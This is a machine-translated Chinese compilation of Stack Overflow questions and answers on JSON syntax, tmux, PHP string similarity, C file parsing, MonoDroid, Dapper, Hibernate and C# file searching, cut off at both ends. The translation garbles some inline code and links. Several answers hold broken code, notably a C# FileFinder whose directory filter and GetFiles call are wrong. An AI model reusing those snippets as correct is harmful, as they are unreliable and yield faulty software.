另一个有用的提示：如果你想绘制但不在特定区域（类似于蒙版或“洞”），请使用“洞”形状（任何形状）调用图形的 setClip() 方法，然后调用Clear() 方法（背景应事先设置为“孔”颜色）。

您可以通过在调用方法 setClip() 之后调用方法 clip()（任何时候）来制作更复杂的剪辑区域，以具有剪辑形状的交叉点。

我没有找到任何合并或反转剪辑区域的方法，只有交叉点，太糟糕了......

希望能帮助到你

# json - JSON包含减号（“-”）字符：这是有效/标准吗？

> ID：10148423
> 
> 赞同：3
> 
> 时间：2012-04-13T21:16:17.193
> 
> 标签：json, syntax

我正在使用一个发送 JSON 响应的 API，如下所示：

```
 [
  - {
    "id": 46843639,
    "nickname": "JSON",
    "registration_date": "2004-03-07T23:16:20.000-04:00",
    "country_id": "BR",
    "user_type": "normal",
    "logo": null,
    "points": 91,
    "site_id": "JSN",
    "permalink": "http://xxxxxx",
    "seller_reputation": - {
      "level_id": "2_orange",
      "power_seller_status": null,
      "transactions": - {
        "period": "historic",
        "total": 14,
        "completed": 8,
        "canceled": 6,
        "ratings": - {
          "positive": 1,
          "negative": 0,
          "neutral": 0,
        },
      },
    },
    "status": - {
      "site_status": "active",
    },
  },
] 
```

我在任何规范文档中都找不到减号“-”。这是 JSON 标准吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:18:16.187

不，这不对。服务器正在向您发送损坏的 JSON。

唯一`-`有效的时间是它位于字符串中、紧接在数字之前或紧跟在浮点数中的`e`or之后。`E`

除此之外，逗号应该*分隔*名称/值对和数组元素，而不是跟随它们。每个对象/数组中最后一个条目后面的逗号也是无效的。

# asp.net - Asp.net webservice 调用在 IIS 中创建大量线程

> ID：10148425
> 
> 赞同：0
> 
> 时间：2012-04-13T21:16:24.557
> 
> 标签：asp.net, web-services

我有一个使用 .Net 远程处理与桌面应用程序通信的 Web 服务。客户端或用户正在使用此 Web 服务将任何数据插入或更新到数据库（经过一些处理后通过桌面应用程序）。我面临的问题是，在高峰期，这意味着在 15 到 20 分钟内调用 2000 - 3000 次这个 web 服务来插入/更新数据。我可以看到线程数增加到 2000 左右。（在w3wp.exe 的任务管理器）。创建这么多线程的可能原因是什么？正如我所看到的，其他 Web 服务只显示不到 50 个线程。

注意：导致问题的 Web 服务位于差异应用程序池中。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T21:35:24.193

It means many calls are waiting for response. Since ASP.NET uses thread pool, you should use them for fast operations or instead use ASYNC handlers so the thread backs to the pool and ASP.NET assigns a new thread as soon as the result gets ready.

It can be result of deadlock in `BRL` or `DLL` or anything else. Try putting a break-point in web service code and find where it gets blocked.

# android - 制作文件资源管理器的 Dream.In.Code 教程中是否有错误？

> ID：10148431
> 
> 赞同：0
> 
> 时间：2012-04-13T21:17:10.583
> 
> 标签：android

我在这里遇到了教程：

[http://www.dreamincode.net/forums/topic/190013-creating-simple-file-chooser/](http://www.dreamincode.net/forums/topic/190013-creating-simple-file-chooser/)

在教程中，找到这一行（在浏览器上使用 ctrl+f）：

> v = vi.inflate(id, null);

这行不应该是 v=vi.inflate(R.layout.file_view,null) 吗？

inflate 方法的第一个参数必须是资源，对吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-13T21:31:53.300

在构造函数中，id 被设置为它看起来像的文本视图的资源 id。

```
public class FileArrayAdapter extends ArrayAdapter<Option>{
    .
    .
    id = textViewResourceId;
    .
    .
} 
```

我不熟悉那个网站，也没有测试过他们的代码，但从表面上看，至少那部分似乎不成问题。

# javascript - 是否可以使用 ProcessingJS 进行多个同时键输入？

> ID：10148435
> 
> 赞同：0
> 
> 时间：2012-04-13T21:17:45.530
> 
> 标签：javascript, html, canvas, html5-canvas, processing

我正在处理一个 RTS 风格的 webapp，这意味着有一个小地图代表一个更大的地图，用户在任何给定时刻只能看到其中的一小部分。我刚刚添加了使用箭头键导航地图的功能，即：

```
 void keyPressed(){
    if(key == CODED){
        switch(keyCode){
            case(UP): //go up
            case(DOWN): //go down , etc 
```

但是，我希望能够通过按下两个箭头键的组合让用户沿对角线移动。现在，这似乎是不可能的，因为“keyCode”似乎一次只能保存一个值。

有人知道这个问题的任何解决方法吗？

最好的，
萨米

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T06:14:56.943

正如@Xenethyl 在评论中的链接中指出的那样，解决此问题的一种方法是跟踪按键的按下时间，然后观察按键的释放时间。可以安全地假设在这两个事件之间的时间段内按住键。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-25T19:06:55.567

我会在**javascript**中执行以下操作：

```
 document.onkeydown = keydown; 

    function keydown(evt) { 

    if (!evt) evt = event; 

    if (evt.ctrlKey && evt.altKey && evt.keyCode==115) {

        alert("CTRL+ALT+F4"); } 

    else if (evt.shiftKey && evt.keyCode == 9) { 

        alert("Shift+TAB"); }  

    } 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-14T15:54:02.013

我没有对此进行测试-但您是否尝试过：

```
 void keyPressed(){
      if(key == 'a' && key == 'b'){
           println("this just happened");
      }
 } 
```

如果这可行，您可以找到箭头键的 ascii 值，而不是使用键 CODED。

# java - 如何在java中删除url字符串的前两段？

> ID：10148447
> 
> 赞同：1
> 
> 时间：2012-04-13T21:18:33.810
> 
> 标签：java, android

如果我有一个像“http://www.google.com”这样的 url 字符串，如何在 java 中将其转换为“google.com”？我假设有一种方法可以使用 java 中的函数来解析它，任何帮助都会有很大帮助，谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-13T21:25:19.753

创建一个[URL](http://docs.oracle.com/javase/6/docs/api/java/net/URL.html)对象，然后使用提供的方法来获取您需要的任何内容。

例子：

```
URL myURL= new URL("http://www.google.com");
String host = myURL.getHost(); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-13T21:21:04.497

使用[java.net.URL](http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html)类，有一个方法`getHost()`可以做到这一点。

使用内置方法要容易得多，而不是使用自己的方法（您需要了解多个子域，不同的协议，如 https）。

# tmux - 多个 tmux 前缀键组合？

> ID：10148449
> 
> 赞同：29
> 
> 时间：2012-04-13T21:18:49.277
> 
> 标签：tmux

我按照我喜欢的方式设置了 tmux，我选择的前缀键是 `，因为它非常快速且易于使用。

在我尝试使用手机中没有 ` 键的 tmux 之前，一切都是肉汁。反正有没有额外绑定 ^a 到前缀，所以我可以同时使用*BOTH*组合？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-04-14T02:31:20.853

从*tmux* 1.6 开始，您可以使用 session 选项`prefix2`指定第二个前缀键（例如 in `~/.tmux.conf`）：

```
set-option -g prefix `
set-option -g prefix2 C-a 
```

注意：如果您有任何使用 的绑定或脚本`send-prefix`，您可以使用其`-2`选项发送分配给`prefix2`: 的密钥`send-prefix -2`。

在*tmux* 1.6 之前，该`prefix`选项接受以逗号分隔的键列表：

```
set-option -g prefix `,C-a 
```

# php - 谷歌应用引擎 phpBB

> ID：10148450
> 
> 赞同：2
> 
> 时间：2012-04-13T21:18:54.870
> 
> 标签：php, google-app-engine, phpbb

我想知道是否可以将 phpbb 实例安装到 Google App Engine，因为我看到了这个：[https](https://developers.google.com/cloud-sql/) ://developers.google.com/cloud-sql/和这个： http: [//php-apps.appspot.com/](http://php-apps.appspot.com/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-01-16T13:16:48.303

[在 Google App Engine 和 Cloud SQL 上建立一个 phpBB 实例](http://fredsa.allen-sauer.com/2013/07/standing-up-phpbb-instance-on-google.html)。

他们似乎已经做到了。我正在尝试寻找 Youtube 教程。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-25T04:29:32.873

是的，有可能——请参阅：http: [//fredsa.allen-sauer.com/2013/07/standing-up-phpbb-instance-on-google.html](http://fredsa.allen-sauer.com/2013/07/standing-up-phpbb-instance-on-google.html)

（App Engine 现在有一个 PHP 运行时：[https](https://developers.google.com/appengine/docs/php/) ://developers.google.com/appengine/docs/php/ ）。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-02T13:04:24.807

我不是那个专家，但据我所知，GAE 并不是为 PHP 设计的。

您绝对可以将此说明用作[如何](http://jelastic.com/ru/docs/phpbb) 使用 Jelastic 服务添加 phpBB 的基础。给定的指令似乎提供了一个非常容易的开始。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T19:50:16.947

也许。很难说。可以通过 Quercus (JVM) 运行 SQL 和 PHP。您将遇到的限制是 phpBB 是否依赖于 App Engine 不支持的任何特定行为，例如本机文件系统访问。我以前没有听说有人在 GAE 上尝试过 phpBB，所以如果你尝试一下，你会开辟一条道路！

# c - 从文件制作数组然后打印所述数组

> ID：10148453
> 
> 赞同：1
> 
> 时间：2012-04-13T21:19:36.043
> 
> 标签：c

我从文本文档中将以下值扫描到各种数组中：

```
0001:Satriani:Joe:6:38.0
0002:Vai:Steve:1:44.5
0003:Morse:Steve:10:50.0
0004:Van Halen:Eddie:3:25.75
0005:Petrucci:John:8:42.25
0006:Beck:Jeff:3:62.0 
```

我使用以下 while 循环执行此操作：

```
while (fscanf(employeesTXT, "%d:%[^:]:%[^:]:%d:%lf\n", &empID[i], lastName[i], firstName[i], &payGroup[i], &hoursWorked[i]) != EOF)
{
    i++;
} 
```

这运行没有明显的错误。当我尝试再次显示该数据时会出现问题。我用这个 for 循环尝试了它：

```
for(i = 0; i < 16; i++)
{
    printf("%04d - %s - %s - %d - %.2lf\n", empID[i], lastName[i], firstName[i], payGroup[i], hoursWorked[i]);
} 
```

但是，我得到以下结果，而不是预期的结果：

```
4587591 -  -  - 0 - 0.00
0006 -  -  - 0 - 0.00
0052 -  -  - 0 - 0.00
0052 -  -  - 0 - 0.00
0052 -  -  - 0 - 0.00
0320 -  -  - 0 - 0.00
0320 -  -  - 0 - 0.00
0005 -  -  - 0 - 0.00
0004 -  -  - 0 - 0.00
0003 -  -  - 0 - 0.00
0001 - Satriani - Joe - 6 - 38.00
0002 - Vai - Steve - 1 - 44.50
0003 - Morse - Steve - 10 - 50.00
0004 - Van Halen - Eddie - 3 - 25.75
0005 - Petrucci - John - 8 - 42.25
0006 - Beck - Jeff - 3 - 62.00 
```

一开始所有垃圾的原因是什么，我能做些什么来删除它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T21:21:53.610

很可能您在执行循环之前从未初始化`i`为零。`fscanf`

# php - 检查字符串是否 x% 相等

> ID：10148454
> 
> 赞同：4
> 
> 时间：2012-04-13T21:19:39.053
> 
> 标签：php, javascript, string, comparison

我想比较三个字符串：

```
"a text string" //target string
"a kind of similar text string"
"the cow jumps over the moon" 
```

并设置一个百分比参数，返回与目标相似 x% 的结果。

```
$results = compare($array,$target,80)

$results // Returns an array with str 1,2, because they are at least 80 similar to the target. 
```

另外，在 JavaScript 或 jQuery 中是否可能有类似的功能？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-13T21:23:21.660

在 PHP 中，有函数[`similar_text`](http://php.net/similar_text). 至于 JavaScript，有[PHP.js 项目](http://phpjs.org)，它在 JavaScript 中重新实现 PHP 函数。他们有一个[`similar_text`](http://phpjs.org/functions/similar_text:902)你可以使用的实现。

JavaScript 实现似乎不支持百分比参数。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-13T21:23:38.147

您正在寻找的功能是[similar_text](http://us3.php.net/manual/en/function.similar-text.php)。

它需要一个可选的第三个参数（通过引用传递）放置百分比差异。

在您的情况下，应该执行以下操作：

```
// Returns true if $str1 is at least $pct similar to $str2, otherwise false.
function compare($str1, $str2, $pct)
{
    $p = 0;
    similar_text($str1, $str2, $p);

    return ($p >= $pct);
} 
```

# c# - 如何在背景中创建具有多个图块的图像？

> ID：10148457
> 
> 赞同：0
> 
> 时间：2012-04-13T21:20:15.170
> 
> 标签：c#, wpf, silverlight, windows-phone-7

我想知道如何从许多图像中创建一个图像。我想在我的 Windows Phone 应用程序中创建一个磁贴，如下图所示（特别是人物磁贴）：

[![关联](../Images/ecdaaa745936a365009759c9638819cb.png)](https://i.stack.imgur.com/oawT4.jpg)
[（来源：[addictivetips.com](http://cloud.addictivetips.com/wp-content/uploads/2011/07/WP7-Mango-Live-Tile.jpg)）]

我有九张图片，我会创建一个图像，我会像平铺一样添加到背景中。有谁知道我怎样才能创建一个看起来像那张照片中的图像？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T22:14:07.613

我在这个领域的经验很少，但是您是否考虑过创建一个控件，该控件仅在这样的网格中并排显示多达 9 张图片？然后，您可以独立绑定每个图像并根据需要更改它们。本文介绍了如何在 WP7 中很好地绑定 phontos：

[http://msdn.microsoft.com/en-us/library/hh286418(v=vs.92).aspx](http://msdn.microsoft.com/en-us/library/hh286418(v=vs.92).aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T22:47:41.820

如果您正在谈论组装像 jpeg 或位图这样的实际图形图像，则需要查看[Image Class](http://msdn.microsoft.com/en-us/library/system.drawing.image.aspx)、[Bitmap Class](http://msdn.microsoft.com/en-us/library/system.drawing.bitmap.aspx)和[Graphics Class](http://msdn.microsoft.com/en-us/library/system.drawing.graphics.aspx)。本质上，您需要实施以下步骤：

1.  使用 Image 中的 From 方法加载相关图像，通常是`Image.FromFile`.
2.  确定您将使用的行数和列数。
3.  使用添加了适当填充的加载图像的宽度和高度计算布局的总宽度和高度。
4.  使用正确的背景颜色和 iamge 格式创建适当大小的新位图。
5.  具有当前绘图位置 (x & y) 的变量。
6.  在布局中具有当前行和列的变量。
7.  在一个循环中，创建您的 Graphics 对象。
8.  用于`Graphics.DrawImage`将加载的图像添加到布局位图。
9.  酌情增加绘图行和/或列。
10.  计算新的绘图位置。
11.  重复直到完成。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-14T11:41:37.530

一种选择是使用[WriteableBitmapEx](http://writeablebitmapex.codeplex.com/)

您也可以在这里找到您问题的答案：[如何将两张图像合并为一张？](https://stackoverflow.com/questions/7186878/how-can-i-merge-two-images-into-one)

# mono - 无法让 MonoDroid 4.0.6 x86 Emulation 或 GoogleTV 工作

> ID：10148458
> 
> 赞同：2
> 
> 时间：2012-04-13T21:20:26.340
> 
> 标签：mono, x86, xamarin.android, google-tv

首先，我在 OSX 10.7.3 上使用 MonoDevelop 2.8.8.4 和 MonoDroid 4.0.6 和 Mono 2.10.9。

所以我购买了 MFA 并创建了通用的“Mono for Android Application”项目进行测试。我已经在 Option/Build/MonoForAndroidBuild 下的 Advanced 选项卡中检查了 ABI 为“armeabi”、“armeabi-v7a”和“x86”。我还将构建设置为发布。然后我转到 fileMenu 中的 Project/CreateAndroidProject 来构建我的 apk 文件，我将使用它上传到 Logitech Revue GoogleTV 设备或 x86 模拟器。

上传并运行应用程序后，我收到错误消息：“应用程序 AndroidTest（进程 AndroidTest.AndroidTest）已意外停止。请重试。”。

使用 Android 模拟器“API lvl 10 Intel Atom x86”时，我也会遇到同样的错误。有没有人让 MonoDroid 在任何 x86 平台上工作？如果是这样，您使用的是哪一个以及设置是什么？您使用的是 VirtualBox 还是标准的 AndroidEmulator？另外，您使用了什么 API 级别，您需要设置什么 MonoDroid proj/sln 设置才能使其正常工作？注意：我使用的项目适用于我的 ARM android 手机设备和 ARM AndroidEmulator。

我还设置了 AndroidManifest.xml 标志::

```
<uses-feature android:name="android.hardware.touchscreen" android:required="false" /> 
```

当我使用“adb logcat”时，它会在 x86 仿真器上给出错误：：“java.lang.UnsatisfiedLinkError：无法加载库：reloc_library [1311]：799 无法找到 'atexit'...”

**编辑 - 这是在 Logitech GoogleTV 上运行应用程序时的 logcat 信息::** "

> I/ActivityManager(193): 开始: Intent { act=android.intent.action.MAIN flg=0x10200000 cmp=com.Reign.WaterDemo_Android/waterdemo_android.Activity1 } 从 pid 247 I/ActivityManager(193): 启动 proc com.Reign .WaterDemo_Android 用于活动 com.Reign.WaterDemo_Android/waterdemo_android.Activity1：pid=2084 uid=10060 gids={1015} I/ActivityThread（2084）：Pub com.Reign.WaterDemo_Android。**mono_init**：mono.MonoRuntimeProvider D / AndroidRuntime（2084）：关闭VM W / dalvikvm（2084）：threadid = 1：线程退出未捕获异常（组= 0x66995778）E / AndroidRuntime（2084）：致命异常：主要E / AndroidRuntime（ 2084）：java.lang.UnsatisfiedLinkError：无法加载 monodroid：findLibrary 返回 null E/AndroidRuntime（2084）：在 java.lang.Runtime.loadLibrary（Runtime.java:425） E/AndroidRuntime（2084）：在 java。 lang.System.loadLibrary(System.java:554) E/AndroidRuntime(2084): 在 mono.MonoPackageManager.LoadApplication(MonoPackageManager.java:24) E/AndroidRuntime(2084): 在 mono.MonoRuntimeProvider.attachInfo(MonoRuntimeProvider.java: 22) E/AndroidRuntime(2084)：在 android.app.ActivityThread.installProvider(ActivityThread.java:3938) E/AndroidRuntime(2084)：在 android.app.ActivityThread。installContentProviders(ActivityThread.java:3693) E/AndroidRuntime(2084): 在 android.app.ActivityThread.handleBindApplication(ActivityThread.java:3649) E/AndroidRuntime(2084): 在 android.app.ActivityThread.access$2200(ActivityThread.java :124) E/AndroidRuntime(2084): 在 android.app.ActivityThread$H.handleMessage(ActivityThread.java:1054) E/AndroidRuntime(2084): 在 android.os.Handler.dispatchMessage(Handler.java:99) E /AndroidRuntime(2084): 在 android.os.Looper.loop(Looper.java:132) E/AndroidRuntime(2084): 在 android.app.ActivityThread.main(ActivityThread.java:4083) E/AndroidRuntime(2084):在 java.lang.reflect.Method.invokeNative(Native Method) E/AndroidRuntime(2084): 在 java.lang.reflect.Method.invoke(Method.java:491) E/AndroidRuntime(2084): 在 com.android。内部操作系统ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:841) E/AndroidRuntime(2084)：在 com.android.internal.os.ZygoteInit.main(ZygoteInit.java:599) E/AndroidRuntime(2084)：在 dalvik.system。 NativeStart.main(Native Method) W/ActivityManager(193)：强制完成活动 com.Reign.WaterDemo_Android/waterdemo_android.Activity1 D/dalvikvm(193)：GC_FOR_ALLOC 释放 324K，18% 释放 9559K/11591K，暂停 59ms I/dalvikvm-堆（193）：将堆（碎片情况）增加到 9.816MB，分配 178700 字节 D/dalvikvm（193）：GC_FOR_ALLOC 释放 9K，18% 空闲 9723K/11783K，暂停 59ms D/dalvikvm（193）：GC_FOR_ALLOC 释放 117K， 19% 空闲 9606K/11783K，暂停 58 毫秒 I/dalvikvm-heap（193）：将堆（碎片情况）增加到 10.794MB，分配 1155900 字节 D/dalvikvm（193）：GC_FOR_ALLOC 释放 2K，18% 空闲 10733K/12935K，暂停 56 毫秒 D/dalvikvm（193）：GC_FOR_ALLOC 释放 <1K，18% 空闲 10733K/12935K，暂停 57ms I/dalvikvm-heap(193)：将堆（碎片情况）增加到 12.752MB，分配 2054924 字节 D/dalvikvm(193)：GC_FOR_ALLOC 释放 0K，15% free 12740K/14983K, paused 57ms W/ActivityManager(193): Activity pause timeout for ActivityRecord{66e1c680 com.Reign.WaterDemo_Android/waterdemo_android.Activity1} D/dalvikvm(193): GC_CONCURRENT freed 12K, 15% free 12867K/14983K, paused 1ms+3msGC_CONCURRENT 释放 12K，15% 释放 12867K/14983K，暂停 1ms+3msGC_CONCURRENT 释放 12K，15% 释放 12867K/14983K，暂停 1ms+3ms

"

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-17T01:24:02.497

Google TV 不支持 NDK，因此 MonoDroid Java 框架无法加载 libmonodroid.so 库。目前没有可用的 ABI。

在 Google TV 上有一个针对 NDK 支持的功能请求：

[http://code.google.com/p/googletv-issues/issues/detail?id=12](http://code.google.com/p/googletv-issues/issues/detail?id=12)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-23T15:29:00.183

这是一个已知问题，它会影响所有 x86 模拟器中的 Mono for Android 应用程序，针对此问题的修复将包含在 Mono for Android 的下一个版本中。这是 Google x86 ndk 中的一个错误，据说已经修复（但事实证明，它不是），所以我们不得不做一些变通方法。您的应用程序的调试版本应该可以正常工作，这只会影响发布版本。

# c#-4.0 - 使用 Dapper.Net ORM，如何将存储过程输出转换为具体类型？

> ID：10148459
> 
> 赞同：2
> 
> 时间：2012-04-13T21:20:26.633
> 
> 标签：c#-4.0, stored-procedures, sql-server-2008-r2, metadata, dapper

使用 Entity Framework，我可以从我正在处理的项目的数据库中的大多数存储过程中创建具体的类。但是，一些存储过程使用动态 SQL，因此不会为存储过程返回元数据。

所以对于那个 sproc，我手动创建了一个具体的类，现在想要将 sproc 输出映射到这个类并返回这个类型的列表。

使用以下方法，我可以获得对象集合：

```
 var results = connection.Query<object>("get_buddies", 
                    new {   RecsPerPage = 100,
                            RecCount = 0,
                            PageNumber = 0,
                            OrderBy = "LastestLogin",
                            ProfileID = profileID,
                            ASC = 1}, 
                        commandType: CommandType.StoredProcedure); 
```

我的具体课程包含

```
[DataContractAttribute(IsReference=true)]
[Serializable()]
public partial class LoggedInMember : ComplexObject
{

   /// <summary>
    /// No Metadata Documentation available.
    /// </summary>
    [EdmScalarPropertyAttribute(EntityKeyProperty=false, IsNullable=false)]
    [DataMemberAttribute()]
    public global::System.Int16 RowID
    {
        get
        {
            return _RowID;
        }
        set
        {
            OnRowIDChanging(value);
            ReportPropertyChanging("RowID");
            _RowID = StructuralObject.SetValidValue(value);
            ReportPropertyChanged("RowID");
            OnRowIDChanged();
        }
    }
    private global::System.Int16 _RowID;
    partial void OnRowIDChanging(global::System.Int16 value);
    partial void OnRowIDChanged();

    [EdmScalarPropertyAttribute(EntityKeyProperty=false, IsNullable=false)]
    [DataMemberAttribute()]
    public global::System.String NickName
    {
        get
        {
            return _NickName;
        }
        set
        {
            OnNickNameChanging(value);
            ReportPropertyChanging("NickName");
            _NickName = StructuralObject.SetValidValue(value, false);
            ReportPropertyChanged("NickName");
            OnNickNameChanged();
        }
    }
    private global::System.String _NickName;
    partial void OnNickNameChanging(global::System.String value);
    partial void OnNickNameChanged();
    .
    .
    . 
```

无需遍历结果并将输出参数添加到 LoggedInMember 对象，如何动态映射这些参数，以便可以通过 WCF 服务返回它们的列表？

如果我尝试`var results = connection.Query<LoggedInMember>("sq_mobile_get_buddies_v35", ...`，我会收到以下错误：

> System.Data.DataException：解析列 0 时出错（RowID=1 - Int64）---> System.InvalidCastException：指定的转换无效。在反序列化...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-05T21:23:19.720

猜测您的 SQL 列是`bigint`（即`Int64`aka `long`），但您的 .Net 类型具有 Int16 属性。

您可以通过执行以下操作来玩转转换并忽略存储过程：

```
var results = connection.Query<LoggedInMember>("select cast(9 as smallint) [RowID] ..."); 
```

您只需选择要返回对象的属性和类型。（`smallint`是 SQL 的等价物`Int16`）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-06T14:07:19.380

The solution to this was to create a complex object derived from the sproc with EF:

```
 public ProfileDetailsByID_Result GetAllProfileDetailsByID(int profileID)
    {
        using (IDbConnection connection = OpenConnection("PrimaryDBConnectionString"))
        {
            try
            {
                var profile = connection.Query<ProfileDetailsByID_Result>("sproc_profile_get_by_id",
                    new { profileid = profileID },
                    commandType: CommandType.StoredProcedure).FirstOrDefault();

                return profile;
            }
            catch (Exception ex)
            {
                ErrorLogging.Instance.Fatal(ex);        // use singleton for logging
                return null;
            }
        }
    } 
```

In this case, ProfileDetailsByID_Result is the object that I manually created using Entity Framework through the Complex Type creation process (right-click on the model diagram, select Add/Complex Type..., or use the Complex Types tree on the RHS).

**A WORD OF CAUTION**

Because this object's properties are derived from the sproc, EF has no way of knowing if a property is nullable. For any nullable property types, **you must manually configure these** by selecting the property and setting its it's Nullable property to `true`.

# java - Spring根据表中的行数生成ID

> ID：10148472
> 
> 赞同：0
> 
> 时间：2012-04-13T21:21:05.340
> 
> 标签：java, hibernate, spring-mvc, entity

我正在开发一个 Spring 3 MVC 应用程序。我使用休眠作为ORM。在定义模型时，我有一个 ID 字段。我想以这样的方式自动生成它，它的值是表中的当前行数 + 1。怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:25:08.163

`AUTOINCREMENT`列或序列可以解决问题。在 Hibernate 中，只需`id`用注释`@GeneratedValue`：

```
@Id
@GeneratedValue(strategy=GenerationType.AUTO)
private int id; 
```

Hibernate 会自动将 id 设置为下一个可用值。

# 也可以看看

*   [休眠自动增量 ID](https://stackoverflow.com/questions/2011528/hibernate-auto-increment-id)

# javascript - 使用 Raphael g.bar 设置颜色

> ID：10148475
> 
> 赞同：0
> 
> 时间：2012-04-13T21:21:15.697
> 
> 标签：javascript, raphael

我有一个简单的单列堆积条形图。

这在操作方面有效，但我想：1）设置每个条的颜色 2）找到类型选项列表（类型：“软”）

```
var b = Raphael("holder"),
data = [[75], [150], [300]];
txtattr = { font: "12px sans-serif" };

//(location_LR, location_TB)
b.text(85, 80, "Simple one column, stacked, bar chart").attr(txtattr);
//(location_LR, location_TB, width, height)
b.barchart(50, 80, 80, 210, data, {stacked: true, type: "soft"}); 
```

谢谢

# c# - 如何让程序快速搜索文件

> ID：10148478
> 
> 赞同：2
> 
> 时间：2012-04-13T21:21:23.843
> 
> 标签：c#

我编写了一个程序来查找计算机中的特定文件，但是它在获取计算机上的许多文件时遇到了缓慢和延迟的问题

此功能正在获取所有文件

```
void Get_Files(DirectoryInfo D)
        {
            FileInfo[] Files;
            try
            {
                Files = D.GetFiles("*.*");
                foreach (FileInfo File_Name in Files)
                    listBox3.Items.Add(File_Name.FullName);
            }
            catch { }

            DirectoryInfo[] Dirs;
            try
            {
                Dirs = D.GetDirectories();
                foreach (DirectoryInfo Dir in Dirs)
                {
                    if (!(Dir.ToString().Equals("$RECYCLE.BIN")) && !(Dir.ToString().Equals("System Volume Information")))
                        Get_Files(Dir);
                }
            }
            catch { }
        } 
```

还有另一种方法可以让所有计算机文件更快一点吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:58:11.783

使用分析器找出最慢的操作。然后考虑如何让它更快。否则你可以通过优化一些东西来浪费你的时间，这不是瓶颈，也不会给你带来预期的加速。

In your case, you will probably find, that when you call this function for the first time (when directory structure is not in cache), most time will be spent in GetDirectories() and GetFiles() functions. You can pre-cache list of all files in memory (or in database) and use FileSystemWatcher to monitor changes in filesystem to update your file list with new files. Or you can use existing services, such as Windows Indexing service, but these may not be available on every computer.

Second bottleneck could be adding files to ListBox. If number of added item is large, you can temporarily disable drawing of listbox using [ListBox.BeginUpdate](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.beginupdate.aspx) and when you finish, enable it again with [ListBox.EndUpdate](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.endupdate.aspx). This can sometimes lead to huge speed up.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-13T21:25:10.503

答案通常取决于您的操作系统。在任何情况下，您都希望建立和维护自己的文件数据库；像您的示例中的显式搜索将太昂贵且太慢。

Linux（和 Mac OS X，如果我没记错的话）上的标准解决方案是维护一个[locateb](http://linux.about.com/od/commands/l/blcmdl5_locatedb.htm)文件，该文件由系统定期更新。如果在这些系统上运行，您的程序可以对该数据库进行查询。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-13T21:47:12.497

部分问题是 GetFiles 方法在获取文件夹中的所有文件之前不会返回，并且如果您正在执行递归搜索，那么对于您递归进入的每个子文件夹，它将花费越来越长的时间。

研究使用 DirectoryInfo.EnumerateFile 或 DirectoryInfo.EnumerateFileSystemInfos

从文档：

> EnumerateFiles 和 GetFiles 方法的区别如下： 使用 EnumerateFiles 时，可以在返回整个集合之前开始枚举 FileInfo 对象的集合；使用 GetFiles 时，必须等待返回整个 FileInfo 对象数组，然后才能访问该数组。因此，当您处理许多文件和目录时，EnumerateFiles 会更有效。

EnumerateFileSystemInfos 也是如此

您还可以查看查询索引服务（如果它已安装并正在运行）。请参阅 CodeProject 上的这篇文章：

[http://www.codeproject.com/Articles/19540/Microsoft-Indexing-Service-How-To](http://www.codeproject.com/Articles/19540/Microsoft-Indexing-Service-How-To)

我通过谷歌搜索“如何查询 MS 文件系统索引”找到了这个

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-13T21:28:20.877

您可以枚举所有文件一次并存储列表。

但如果你不能做到这一点，这基本上是最好的。你可以做两件小事：

*   尝试使用线程。这在 SSD 上会好很多，但在旋转磁盘上可能会受到伤害
*   使用 DirectoryInfo.GetFileSystemEntries。这将在一次有效的调用中返回文件和目录。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-13T21:31:08.853

您会发现使用和类从文件系统获取额外信息的性能要快得多`Directory.GetFiles()`，这比简单地返回基于字符串的文件名要慢得多。`FileInfo``DirectoryInfo`

这是一个代码示例，它应该会产生很大改进的结果，并将检索文件的操作从在列表框中显示它们的操作中抽象出来。

```
static void Main(string[] args)
{
    var fileFinder = new FileFinder(@"c:\SomePath");
    listBox3.Items.Add(fileFinder.Files);
}

/// <summary>
/// SOLID: This class is responsible for recusing a directory to return the list of files, which are 
/// not in an predefined set of folder exclusions.
/// </summary>
internal class FileFinder
{
    private readonly string _rootPath;
    private List<string> _fileNames;
    private readonly IEnumerable<string> _doNotSearchFolders = new[] { "System Volume Information", "$RECYCLE.BIN" };

    internal FileFinder(string rootPath)
    {
        _rootPath = rootPath;
    }

    internal IEnumerable<string> Files
    {
        get
        {
            if (_fileNames == null)
            {
                _fileNames = new List<string>();
                GetFiles(_rootPath);
            }

            return _fileNames;
        }
    }

    private void GetFiles(string path)
    {
        _fileNames.AddRange(Directory.GetFiles("*.*"));

        foreach (var recursivePath in Directory.GetDirectories(path).Where(_doNotSearchFolders.Contains))
        {
            GetFiles(recursivePath);
        }
    }
} 
```

# python - 使用 pygame 绘制图元时的伪影？

